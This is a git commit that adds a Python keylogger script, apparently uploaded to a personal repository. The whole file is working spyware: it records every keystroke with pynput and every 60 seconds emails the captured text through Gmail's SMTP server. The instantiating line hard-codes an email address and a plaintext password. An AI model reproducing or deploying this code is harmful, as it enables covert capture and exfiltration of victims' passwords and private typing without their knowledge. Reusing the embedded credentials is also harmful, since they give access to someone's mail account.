6a18f39db9e275b1a5c454092dad6bb5adb54aa2
NoahSiva <94896813+NoahSiva@users.noreply.github.com>
2022-04-11 15:44:16 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,46 @@
+import threading
+import pynput.keyboard as keyboard
+import smtplib
+
+
+class Keylogger:
+    def __init__(self, time, email, password):
+        self.keys = ""
+        self.time=time
+        self.email=email
+        self.password=password
+        self.start()
+
+    def log(self, string):
+        self.keys+=string
+    
+    def key_press(self, key):
+        try:
+            current_key=str(key.char)
+        except AttributeError:
+            if key==key.space:
+                current_key=" "
+            else:
+                current_key= " "+str(key)+" "
+        self.log(current_key)
+
+    def send_mail(self, email, password, message):
+        server=smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def sendReport(self):
+        self.send_mail(self.email, self.password, self.keys)
+        self.keys=' '
+        timer=threading.Timer(self.time, self.sendReport)
+        timer.start()
+
+    def start(self):
+        listen = keyboard.Listener(on_press=self.key_press)
+        with listen as listener:
+            self.sendReport()
+            listener.join()
+
+my_keylogger=Keylogger(60, "noahsiva123@gmail.com", "hfJv_tw6")
